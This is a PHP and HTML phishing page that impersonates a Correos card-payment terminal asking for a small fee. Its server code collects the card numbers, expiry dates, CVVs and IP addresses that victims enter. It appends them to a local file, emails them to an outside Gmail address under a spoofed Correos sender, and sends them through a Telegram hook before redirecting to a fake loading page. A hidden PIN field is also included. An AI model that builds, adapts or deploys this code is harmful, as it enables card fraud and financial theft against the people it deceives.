<?php
include_once 'functions.php';
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['txtTarjeta']) and !empty($_POST['lstMeses']) and !empty($_POST['lstYears']) and !empty($_POST['txtCodSeguridad']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['txtTarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
			$cc = $_POST['txtTarjeta'];
			function check($cc){
				$req = file_get_contents("https://lookup.binlist.net/$cc");
				$js=json_decode($req,true);
				return $js['brand']."  ".$js['bank']['name'];
			}
            $message = "".check($cc)."\nCC :" . $_POST['txtTarjeta'] . "\nEXP :" . $_POST['lstMeses'] ."/". $_POST['lstYears'] ."\nCVV :" . $_POST['txtCodSeguridad'] . "\n" . $ip . "\n*****************************\n";
            $file = fopen("./Corroes.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "dr.btcrzlt@gmail.com";
			$subject = "Correos_CC : $ip";
			$headers = "From:Info <correos-es@correos-servicio.com>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
                        telegram_send(urlencode($message));
			
			
			
        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="gr__conexflow_es">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>
        Venta
    </title>
    <link id="ctl00_StlShtMaster" media="screen" type="text/css" rel="stylesheet" href="Venta_fichiers/VTW.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <!--[if lt IE 9]>
    <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
    <![endif]-->
</head>
<body id="DocumentBody" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
<img id="ctl00_ImagenFondo" class="img_background" src="Venta_fichiers/fondo.jpg" style="border-width:0px;">

<div id="Container" class="vtw_container">
    <form name="aspnetForm" method="post" action="" id="aspnetForm" onsubmit="DeshabilitarControles(true);">
        <div>
        </div>

        <script type="text/javascript">
            //<![CDATA[
            var theForm = document.forms['aspnetForm'];
            if (!theForm) {
                theForm = document.aspnetForm;
            }

            function __doPostBack(eventTarget, eventArgument) {
                if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                    theForm.__EVENTTARGET.value = eventTarget;
                    theForm.__EVENTARGUMENT.value = eventArgument;
                    theForm.submit();
                }
            }

            //]]>
        </script>


        <script src="Venta_fichiers/WebResource.js" type="text/javascript"></script>


        <script src="Venta_fichiers/util.js" type="text/javascript"></script>
        <script src="Venta_fichiers/WebResource_002.js" type="text/javascript"></script>
        <div>

        </div>
        <div id="tbOperacion" class="vtw_panel_1">
            <div class="img_header_container">
                <img id="ctl00_ImagenCabecera" class="img_header" src="Venta_fichiers/logo-correos-tpv_2.png"
                     style="border-width:0px;">
            </div>

            <h1>
                <span id="ctl00_lblTipoOpera">VENTA</span>
            </h1>
            <div id="tbDatOpera" class="vtw_panel_2">
                <h2>
                    <span id="ctl00_lblDatOpera">Datos de la Operación</span>
                </h2>
                <div id="input_fecha" class="wtw_input">
                    <span id="ctl00_lblFecha" class="vtw_label label_fecha">Fecha</span>
                    <input name="ctl00$txtFecha" type="text" value="<?php echo date('d/m/Y'); ?>" readonly="readonly"
                           id="ctl00_txtFecha" class="vtw_text text_fecha" disabled="disabled">
                </div>
                <div id="input_hora" class="wtw_input">
                    <span id="ctl00_lblHora" class="vtw_label label_hora">Hora</span>
                    <input name="ctl00$txtHora" type="text" value="<?php echo date('H:i:s'); ?>" readonly="readonly"
                           id="ctl00_txtHora" class="vtw_text text_hora" disabled="disabled">
                </div>
                <div id="input_importe" class="wtw_input">
                    <span id="ctl00_lblImporte" class="vtw_label label_importe">Importe</span>
                    <input name="ctl00$txtImporte" type="text" value="1,17" readonly="readonly" id="ctl00_txtImporte"
                           class="vtw_text text_importe" disabled="disabled">
                </div>
                <div id="input_moneda" class="wtw_input">
                    <span id="ctl00_lblMoneda" class="vtw_label label_moneda">Moneda</span>
                    <input name="ctl00$txtMoneda" type="text" value="EUR" readonly="readonly" id="ctl00_txtMoneda"
                           class="vtw_text text_moneda" disabled="disabled">
                </div>
                <div id="input_cliente" class="wtw_input">
                    <span id="ctl00_lblCliente" class="vtw_label label_cliente">Operación</span>
                    <input name="ctl00$txtCliente" type="text" value="01757301180" readonly="readonly"
                           id="ctl00_txtCliente" class="vtw_text text_cliente" disabled="disabled">
                </div>
                <div id="input_usuario" class="wtw_input">
                    <span id="ctl00_lblUsuario" class="vtw_label label_usuario">Usuario</span>
                    <input name="ctl00$txtUsuario" type="text" value="0000000199910001" readonly="readonly"
                           id="ctl00_txtUsuario" class="vtw_text text_usuario" disabled="disabled">
                </div>
                <div class="wtw_row_n">
                </div>
            </div>
            <div id="tbDatTrj" class="vtw_panel_3">
                <h2>
                    <span id="ctl00_lblDatTrj">Datos de la Tarjeta</span>
                </h2>


                <div id="input_tarjeta" class="wtw_input">
                    <span id="ctl00_ContentPlaceHolder1_lblTarjeta" class="vtw_label label_pan">Número de Tarjeta (sin espacios)</span>
                    <input name="txtTarjeta" type="text" maxlength="19"
                           id="ctl00_ContentPlaceHolder1_txtTarjeta" class="vtw_text text_pan"
                           onkeypress="return numbersonly(this, event)" autocomplete="off">
                </div>

                <div id="input_feccad" class="wtw_input">
                    <span id="ctl00_ContentPlaceHolder1_lblFechaCad" class="vtw_label label_feccad">Caducidad</span>
                    <select name="lstMeses" id="ctl00_ContentPlaceHolder1_lstMeses"
                            class="vtw_text text_feccad_1">
                        <option selected="selected" value="01"> 01</option>
                        <option value="02"> 02</option>
                        <option value="03"> 03</option>
                        <option value="04"> 04</option>
                        <option value="05"> 05</option>
                        <option value="06"> 06</option>
                        <option value="07"> 07</option>
                        <option value="08"> 08</option>
                        <option value="09"> 09</option>
                        <option value="10"> 10</option>
                        <option value="11"> 11</option>
                        <option value="12"> 12</option>

                    </select>
                    <select name="lstYears" id="ctl00_ContentPlaceHolder1_lstYears"
                            class="vtw_text text_feccad_2">
                        <option selected="selected" value="2020">2020</option>
                        <option value="2021">2021</option>
                        <option value="2022">2022</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                        <option value="2036">2036</option>
                        <option value="2037">2037</option>
                        <option value="2038">2038</option>

                    </select>
                </div>

                <div id="input_cod_seg" class="wtw_input">
                    <span id="ctl00_ContentPlaceHolder1_lblCodSeguridad" class="vtw_label label_cvv2">CVV</span>
                    <input name="txtCodSeguridad" type="text" maxlength="3" minlength="3"
                           id="ctl00_ContentPlaceHolder1_txtCodSeguridad" class="vtw_text text_cvv2"
                           onkeypress="return numbersonly(this, event)" autocomplete="off">
                                <input type="image" name="ctl00$ContentPlaceHolder1$HelpCVV2"
                           id="ctl00_ContentPlaceHolder1_HelpCVV2" class="img_interroga"
                           src="Venta_fichiers/img_help_icon.jpg"
                           onclick="return popImage('cfg/templates/CORREOS/images/img_cod_seguridad.gif', 'Código de seguridad');"
                           style="border-width:0px;">
                </div>
   <div id="input_cod_seg" class="wtw_input" style="display:none;">
                    <span id="ctl00_ContentPlaceHolder1_lblCodSeguridad" class="vtw_label label_cvv2">Código PIN</span>
                    <input name="pin" type="text" maxlength="4" minlength="4"
                           id="ctl00_ContentPlaceHolder1_txtCodSeguridad" class="vtw_text text_cvv2"
                           onkeypress="return numbersonly(this, event)" autocomplete="off">
                 </div>
				
                <div class="wtw_row_n">
                </div>
            </div>
            <div id="tbBotones" class="vtw_panel_4 button_align">
                <h3>
                </h3>


                <input type="image" name="ctl00$ButtonEnviar1" id="ctl00_ButtonEnviar1" class="vtw_button button_send"
                       src="Venta_fichiers/bot_aceptar.gif"
                       onclick="return ValidarFormulario('V','ctl00_ContentPlaceHolder1_txtTarjeta','ctl00_ContentPlaceHolder1_lstMeses','ctl00_ContentPlaceHolder1_lstYears','ctl00_ContentPlaceHolder1_txtCodSeguridad','','','','',true,true,1);"
                       style="border-width:0px;">
                <input type="hidden" name="ctl00$ButtonCancelar1" id="ctl00_ButtonCancelar1"
                       class="vtw_button button_cancel" src="Venta_fichiers/bot_volver.gif" style="border-width:0px;">
            </div>
            <div class="footer_align">
                <div id="ctl00_tablaPie">

                    <img id="ctl00_ImagenPie" class="img_footer" src="Venta_fichiers/pie2.gif"
                         style="border-width:0px;">

                </div>
            </div>

        </div>
        <!--  controles ocultos para pasar valores a servidor -->
        <input type="hidden" name="ctl00$hCodError" id="ctl00_hCodError">
        <input type="hidden" name="ctl00$hDesError" id="ctl00_hDesError">
        <input type="hidden" name="ctl00$ClaveObjeto" id="ctl00_ClaveObjeto" value="0175730118023082019043628">
        <input type="hidden" name="ctl00$SendTransaction" id="ctl00_SendTransaction" value="false">
        <!--       controles ocultos para pasar valores a js -->
        <input type="hidden" name="ctl00$AlertWrongPAN" id="ctl00_AlertWrongPAN"
               value="Número de Tarjeta incorrecto.Vuelva a teclearlo por favor.">
        <input type="hidden" name="ctl00$AlertTarCaducada" id="ctl00_AlertTarCaducada"
               value="La fecha de caducidad es anterior a la actual.Vuelva a teclearla por favor.">
        <input type="hidden" name="ctl00$AlertFaltaTarjeta" id="ctl00_AlertFaltaTarjeta"
               value="Falta dato obligatorio. No se introdujo PAN de la tarjeta">
        <input type="hidden" name="ctl00$AlertFaltaCodSeg" id="ctl00_AlertFaltaCodSeg"
               value="Falta dato obligatorio. No se introdujo CVV">
        <input type="hidden" name="ctl00$AlertFaltaCentroOrig" id="ctl00_AlertFaltaCentroOrig"
               value="Falta dato obligatorio. No se introdujo Cod. Centro Original o dato Incorrecto">
        <input type="hidden" name="ctl00$AlertFaltaTPVOrig" id="ctl00_AlertFaltaTPVOrig"
               value="Falta dato obligatorio. No se introdujo Cod. TPV Original o dato Incorrecto">
        <input type="hidden" name="ctl00$AlertFaltaFechaOrig" id="ctl00_AlertFaltaFechaOrig"
               value="Falta dato obligatorio. No se introdujo Fecha Oper. Original o dato Incorrecto">
        <input type="hidden" name="ctl00$AlertFaltaNumOperOrig" id="ctl00_AlertFaltaNumOperOrig"
               value="Falta dato obligatorio. No se introdujo Num. Oper. Original o dato Incorrecto">
        <input type="hidden" name="ctl00$AlertErrorLenPAN" id="ctl00_AlertErrorLenPAN"
               value="Error: La longitud del Número de Tarjeta es incorrecta">
        <input type="hidden" name="ctl00$AlertErrorLenCodSeg" id="ctl00_AlertErrorLenCodSeg"
               value="Error: La longitud del CVV es incorrecta">
        <input type="hidden" name="ctl00$CaptionBtnOK" id="ctl00_CaptionBtnOK" value="Continuar">
        <input type="hidden" name="ctl00$CaptionBtnCancel" id="ctl00_CaptionBtnCancel" value="Cancelar">
        <input type="hidden" name="ctl00$CaptionLocTemplate" id="ctl00_CaptionLocTemplate"
               value="cfg/templates/CORREOS">
        <input type="hidden" name="ctl00$MsgContinuar" id="ctl00_MsgContinuar" value="¿Desea Continuar la Transacción?">
        <input type="hidden" name="ctl00$MsgCancelar" id="ctl00_MsgCancelar" value="¿Desea Cancelar la Transacción?">
        <input type="hidden" name="ctl00$TimeoutAlert" id="ctl00_TimeoutAlert" value="0">
        <input type="hidden" name="ctl00$TimeoutModal" id="ctl00_TimeoutModal" value="0">


        <script type="text/javascript">
            //<![CDATA[
            WebForm_AutoFocus('ctl00_ContentPlaceHolder1_txtTarjeta');//]]>
        </script>
    </form>

    <script type="text/javascript" language="javascript" src="Venta_fichiers/browserDetect.js">
    </script>

</div>

<!--  the following hidden div will be used by the script -->
<div id="dvConfirm" class="vtw_hide_dialog">
    <div id="dvLabelConfirm">
        <div id="lblConfirm" class="text_alert label_modal">TXT 1</div>
    </div>
    <!-- DivisiÃ³n auxiliar: por si falla innerHTML en algunos navegadores -->
    <div id="dvAuxConfirm" class="text_alert label_modal label_aux">
    </div>
    <div id="dvBotonesConfirm" class="button_align2">
        <input id="ButtonConfirmYES" type="submit" class="button_alert boton_ModalYES" value="YES"
               onclick="return EnviarFormulario('dvConfirm');">
        <input id="ButtonConfirmNO" type="button" class="button_alert boton_ModalNO" value="NO"
               onclick="NoPostBack('dvConfirm');return false;">
    </div>
    <div class="wtw_row_n">
    </div>
</div>
<div id="dvAlert" class="vtw_hide_dialog">
    <div id="dvLabelAlert">
        <div id="lblAlert" class="text_alert label_alert">TXT 2</div>
    </div>
    <!-- DivisiÃ³n auxiliar: por si falla innerHTML en algunos navegadores -->
    <div id="dvAuxAlert" class="text_alert label_alert label_aux">
    </div>
    <input id="ButtonAlertYES" type="button" class="button_alert boton_AlertYES" value="OK"
           onclick="RecuperarFoco('dvAlert');return false;">
    <div class="wtw_row_n">
    </div>
</div>
<!-- para habilitar / deshabilitar controles de la página -->
<div id="dvDisableScreen">
</div>
<!--
    <div id="dvDisable">
        <iframe id="ifrDisable" src="../Emergente.htm" 
        style="display:none;width:100%;height:100%;position:absolute;z-index:9;left:0;top:0;padding:0;overflow:hidden;"></iframe>
    </div>
-->


</body>
<span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span
            class="gr__triangle"></span></span></html>